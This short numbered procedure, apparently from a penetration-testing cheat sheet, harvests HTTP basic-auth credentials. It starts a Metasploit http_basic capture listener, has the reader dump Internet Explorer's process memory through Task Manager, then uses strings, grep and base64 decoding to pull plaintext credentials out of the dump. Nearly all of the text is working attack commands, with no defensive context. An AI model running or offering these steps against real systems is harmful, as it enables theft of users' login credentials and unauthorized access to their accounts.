
1. **Set Up Metasploit Listener:**
   ```plaintext
   msfconsole
   use auxiliary/server/capture/http_basic
   set uripath x
   run
   ```

2. **Create a Dump File:**
   - On Windows, use Task Manager to create a dump file for `iexplore.exe`.

3. **Extract Credentials from Dump File:**
   ```plaintext
   strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
   echo -ne [Base64 String] | base64 -d
   ```
